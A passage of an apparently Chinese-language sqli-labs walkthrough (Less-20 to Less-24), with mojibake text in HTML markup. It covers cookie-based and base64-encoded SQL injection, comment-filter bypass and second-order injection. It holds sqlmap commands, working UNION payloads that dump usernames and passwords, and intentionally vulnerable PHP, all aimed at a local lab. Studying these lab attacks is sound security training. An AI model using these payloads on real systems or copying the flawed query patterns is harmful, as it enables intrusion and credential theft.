operator">=</span><span class="token string">"uname=admin*"</span>--dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>E -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**å¸ƒå°”ç›²æ³¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin*"</span>--dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**å»¶æ—¶ç›²æ³¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin*"</span>--dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="é«˜çº§æ³¨å…¥å§¿åŠ¿-21-37-å…³"><a href="#é«˜çº§æ³¨å…¥å§¿åŠ¿-21-37-å…³" class="headerlink" title="é«˜çº§æ³¨å…¥å§¿åŠ¿ 21-37 å…³"></a>é«˜çº§æ³¨å…¥å§¿åŠ¿ 21-37 å…³</h1><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=(&#39;$cookee&#39;)</code></td></tr></tbody></table><p><strong>ç®€å•æºç åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> cookie ä¸­ä¸å­˜åœ¨ uname å‚æ•°<span class="token punctuation">:</span>      è¾“å‡ºäº†ä¸€å †æ— ç”¨çš„ä¿¡æ¯    <span class="token keyword">if</span> æäº¤äº† uname å’Œ passwd<span class="token punctuation">:</span>        <span class="token comment"># è¿›è¡Œè¿‡æ»¤</span>        <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> æœ‰æŸ¥è¯¢ç»“æœ<span class="token punctuation">:</span>            <span class="token comment"># å°† uname çš„å€¼è®¾ç½®ç»™ cookie é‡Œé¢çš„ uname å‚æ•°</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token constant">POST</span> æ•°æ®é‡Œé¢æ²¡æœ‰ submit å‚æ•°<span class="token punctuation">:</span>                 <span class="token comment"># å¯¹ cookee è¿›è¡Œ base64 è§£å¯†</span>        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cookee</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment"># ç›´æ¥å°† cookee é€šè¿‡å•å¼•å·æ‹¼æ¥åˆ° SQL è¯­å¥ä¸­</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$cookee</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> æŸ¥è¯¢æ— ç»“æœ<span class="token punctuation">:</span>            è¾“å‡º <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> æœ‰ç»“æœ<span class="token punctuation">:</span>            è¾“å‡ºæŸ¥è¯¢çš„ä¿¡æ¯    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># å°† uname çš„å€¼è®¾ç½®ç»™ cookie é‡Œé¢çš„ uname å‚æ•°</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»æºç ä¸­åˆ†æå¯å¾—ï¼Œå’Œ Less-20 åŸºæœ¬ä¸Šæ˜¯ä¸€æ¯›ä¸€æ ·ï¼Œåªæ˜¯ Coojie è¿™é‡Œæ˜¯ç»è¿‡ base64 åŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ å…¥åŠ å¯†åçš„ payload ç»™ cookie çš„ uname å³å¯ï¼Œä¸‹é¢å°±åªç”¨è”åˆæŸ¥è¯¢æ³¨å…¥æ¥ç®€å•æ¼”ç¤ºä¸€ä¸‹å§ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-21/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSxwYXNzd29yZCBTRVBBUkFUT1IgMHgzYzYyNzIzZSkgRlJPTSB1c2Vycykj</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cookie çš„ uname å‚æ•° Base64 è§£ç ä¸ºï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;sqlsec&#39;) union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://image.3001.net/images/20200514/1589426073817.png" alt="img"></p><h3 id="sqlmap-3"><a href="#sqlmap-3" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>æ‰‹å·¥æ³¨å…¥é—®é¢˜ä¸å¤§ï¼Œé‚£ä¹ˆå°è¯•ç›´æ¥ä½¿ç”¨ sqlmap æ¥è¿›è¡Œè”åˆæŸ¥è¯¢æ³¨å…¥çœ‹çœ‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-21/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=*"</span> --tamper<span class="token operator">=</span><span class="token string">"base64encode"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sqlmap æœ¬èº«ä¸ä¼šæ··æ·†å‘é€çš„ payloadï¼Œæ··æ·† payload çš„è¯å¯ä»¥ä½¿ç”¨ sqlmap è‡ªå¸¦çš„ payload åº“</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=&quot;$cookee&quot;</code></td></tr></tbody></table><p><strong>ç®€å•æºç åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># å…ˆåŒå¼•å· ç„¶åç›´æ¥æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­</span><span class="token variable">$cookee1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span> <span class="token variable">$cookee</span><span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username=<span class="token interpolation"><span class="token variable">$cookee1</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥å‘ç°å’Œ Less-21 ç›¸æ¯”ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ï¼Œå…¶ä»–éƒ½æ˜¯ä¸€è‡´çš„ï¼Œ è¿™é‡Œå°±ä¸å†å•°å—¦äº†ã€‚</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-22/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=c3Fsc2VjIiB1bmlvbiBzZWxlY3QgMSwyLChTRUxFQ1QgR1JPVVBfQ09OQ0FUKHVzZXJuYW1lLHBhc3N3b3JkIFNFUEFSQVRPUiAweDNjNjI3MjNlKSBGUk9NIHVzZXJzKSM=</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cookie çš„ uname å‚æ•° Base64 è§£ç ä¸ºï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;sqlsec&quot; union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>ç®€å•æºç åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># è·å–åˆ° id çš„å€¼</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># è¿‡æ»¤äº† id ä¸­çš„ # å’Œ -- ç„¶å æ›¿æ¢ä¸º ç©º</span><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/#/"</span><span class="token punctuation">;</span><span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/--/"</span><span class="token punctuation">;</span><span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg1</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># ä½¿ç”¨å•å¼•å·æ‹¼æ¥ SQL</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> æœ‰æŸ¥è¯¢ç»“æœ<span class="token punctuation">:</span>    è¾“å‡ºæŸ¥è¯¢ä¿¡æ¯<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è¿‡æ»¤äº†æ³¨é‡Šç¬¦å·</strong>ï¼Œä½†æ˜¯è¿™é‡Œè¿˜å¯ä»¥è€ƒè™‘ä½¿ç”¨é—­åˆæ–¹å¼æ¥è¿›è¡Œæ³¨å…¥ï¼Œä¸‹é¢ç›´æ¥ä½¿ç”¨æœ€ç®€å•çš„è”åˆæŸ¥è¯¢æ³¨å…¥å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,(SELECT(@x)FROM(SELECT(@x:&#x3D;0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,password,0x3c62723e))))x),3 and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>ä¸€ä¸ªç»å…¸çš„äºŒæ¬¡æ³¨å…¥åœºæ™¯ï¼Œæ‰€ä»¥ä¸‹é¢ æ¥å•ä¸ªç†ä¸€ä¸‹æºç ã€‚</p><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><ul><li><code>index.php</code></li></ul><p>ä¸»è¦è®°å½•äº†è¡¨å•ç›¸å…³çš„ä¿¡æ¯ï¼Œæ²¡æœ‰å•¥æ•æ„Ÿä»£ç ï¼Œå½“åš Index.html æ¥çœ‹å¾…å°±å¯ä»¥äº†ï¼Œå…·ä½“çš„ç•Œé¢å¦‚ä¸‹ï¼š</p><p><img src="https://image.3001.net/images/20200515/15895151791144.png" alt="img"></p><p>æç¤ºè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œç”¨æˆ·åå’Œå¯†ç æ­£ç¡®ä¹‹åå°±å¯ä»¥æˆåŠŸç™»é™†ï¼Œå¦åˆ™ç™»é™†å¤±è´¥ã€‚</p><p><code>å¿˜è®°å¯†ç </code>ï¼šå·¦ä¸‹è§’çš„å¿˜è®°å¯†ç é€‰é¡¹æç¤ºï¼šå¦‚æœä½ å¿˜è®°å¯†ç  è¯· hack it</p><p><code>æ–°å»ºç”¨æˆ·</code>ï¼šå³ä¸‹è§’æ–°å»ºç”¨æˆ·å¯ä»¥æ–°å»ºä¸€ä¸ªè‡ªå·±çš„ç”¨æˆ·</p><ul><li><code>failed.php</code></li></ul><p>æ£€æµ‹ä¼šè¯ï¼Œå¦‚æœ cookie é‡Œé¢æ²¡æœ‰ Auth å‚æ•°çš„è¯ï¼Œå°±è·³è½¬åˆ° index.php</p><ul><li><code>forgot_password.php</code></li></ul><p>ç®€å•æç¤ºï¼šå¦‚æœä½ å¿˜è®°å¯†ç  è¯· hack it</p><ul><li><code>Logged-in.php</code></li></ul><p>ç™»å½•åçš„ä¿¡æ¯å±•ç¤ºï¼Œæ˜¾ç¤ºç™»å½•åç§°å¹¶ä¸”æä¾›äº†ä¿®æ”¹å¯†ç çš„è¡¨å•</p><ul><li><code>new_user.php</code></li></ul><p>åˆ›å»ºæ–°ç”¨æˆ·çš„è¡¨å•é¡µé¢ï¼Œæœ¬æ–‡ä»¶ä¸»è¦å­˜æ”¾å‰æ®µä»£ç ã€‚</p><ul><li><code>login_create.php</code></li></ul><p>åˆ›å»ºæ–°ç”¨æˆ·çš„åç«¯ä»£ç ï¼Œä¸‹é¢æ¥ç®€å•ç†ä¸€ä¸‹ä»£ç çš„æµç¨‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># æ¥å—ç”¨æˆ·æäº¤çš„ç”¨æˆ·åå’Œå¯†ç å€¼ å¹¶è¿›è¡Œ mysql å®‰å…¨å‡½æ•°è½¬ä¹‰</span>username<span class="token operator">=</span>  <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># æŸ¥è¯¢å½“å‰ç”¨æˆ·ä¿¡æ¯</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>å¦‚æœå½“å‰ç”¨æˆ·å·²ç»å­˜åœ¨ æ— æ³•æ³¨å†Œ<span class="token keyword">if</span> ä¸¤æ¬¡è¾“å…¥å¯†ç ä¸€è‡´ï¼š  <span class="token comment"># å°†è®°å½•æ’å…¥æ•°æ®åº“ä¸­</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into users ( username, password) values(\"<span class="token interpolation"><span class="token variable">$username</span></span>\", \"<span class="token interpolation"><span class="token variable">$pass</span></span>\")"</span><span class="token punctuation">;</span>    æŸ¥è¯¢å®Œæˆå é‡å®šå‘åˆ°é¦–é¡µ<span class="token keyword">else</span><span class="token punctuation">:</span>    æç¤ºä¸¤æ¬¡è¾“å…¥å¯†ç ä¸ä¸€è‡´<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>`login.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># ç™»å½•ç”¨æˆ·åå’Œå¯†ç éƒ½è¢«è¿‡æ»¤äº†</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>pass_change.php</code></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> æ£€æµ‹æœªç™»å½•ï¼š    é‡å®šå‘åˆ°é¦–é¡µ<span class="token keyword">if</span> æ£€æµ‹åˆ°æäº¤è¡¨å•ï¼š  <span class="token comment"># å¯¹ pass éƒ½è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> ä¸¤æ¬¡å¯†ç ä¸€è‡´<span class="token punctuation">:</span>        <span class="token comment"># ç›´æ¥å°† username æ‹¼æ¥åˆ° SQL è¯­å¥</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        æç¤ºå¯†ç ä¸ä¸€è‡´ å¹¶é‡å®šå‘åˆ° fail<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>ä»ä»£ç ä¸Šæ¥çœ‹è²Œä¼¼éƒ½è¢«è½¬ä¹‰äº†ï¼Œä¹ä¸€çœ‹æ˜¯æˆåŠŸæ³¨å…¥çš„ã€‚å®é™…ä¸Šçš„ç¡®ä¸èƒ½ä½¿ç”¨å¸¸è§„çš„æ€è·¯æ¥è¿›è¡Œæ³¨å…¥ï¼Œå› ä¸ºè¿™é¢˜æ˜¯äºŒæ¬¡æ³¨å…¥ï¼ŒISCC 2019 å½“æ—¶ä½¿ç”¨è¿™é¢˜çš„è€ƒæŸ¥ç‚¹æ˜¯ä¿®æ”¹æ‰ admin ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åå†ç™»å½•å³å¯ã€‚å‡è®¾ä¸çŸ¥é“ admin ç”¨æˆ·çš„æƒ…å†µä¸‹ï¼Œæƒ³è¦ä¿®æ”¹æ‰ admin ç”¨æˆ·çš„å¯†ç çš„è¯ï¼Œè¿™é‡Œå°±ä½¿ç”¨çš„æ˜¯äºŒæ¬¡æ³¨å…¥çš„å§¿åŠ¿äº†ã€‚</p><p><strong>äºŒæ¬¡æ³¨å…¥</strong> ç®€å•æ¦‚æ‹¬å°±æ˜¯é»‘å®¢ç²¾å¿ƒæ„é€  SQL è¯­å¥æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œæ•°æ®åº“æŠ¥é”™çš„ä¿¡æ¯è¢«å…¶ä»–ç±»å‹çš„ SQL è¯­å¥è°ƒç”¨çš„æ—¶å€™è§¦å‘æ”»å‡»è¡Œä¸ºã€‚å› ä¸ºç¬¬ä¸€æ¬¡é»‘å®¢æ’å…¥åˆ°æ•°æ®åº“çš„æ—¶å€™å¹¶æ²¡æœ‰è§¦å‘å±å®³æ€§ï¼Œè€Œæ˜¯å†å…¶ä»–è¯­å¥è°ƒç”¨çš„æ—¶å€™æ‰ä¼šè§¦å‘æ”»å‡»è¡Œä¸ºï¼Œè¿™ä¸ªå°±æ˜¯äºŒæ¬¡æ³¨å…¥ã€‚</p><p>å…ˆçœ‹åˆ›å»ºç”¨æˆ·çš„åœ°æ–¹ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username <span class="token operator">=</span>  mysql_escape_string<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>username è¢« <code>mysql_escape_string</code> å‡½æ•°è¿‡æ»¤äº†ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="left">å±é™©å­—ç¬¦</th><th align="left">è½¬ä¹‰å</th></tr></thead><tbody><tr><td align="left"><code>\</code></td><td align="left"><code>\\</code></td></tr><tr><td align="left"><code>&#39;</code></td><td align="left"><code>\&#39;</code></td></tr><tr><td align="left"><code>&quot;</code></td><td align="left"><code>\&quot;</code></td></tr></tbody></table><p>å†çœ‹ä¸‹æ›´æ–°å¯†ç çš„æ ¸å¿ƒè¯­å¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> PASSWORD<span class="token operator">=</span><span class="token string">'$pass'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$username'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$curr_pass'</span><span aria-hidden="true" 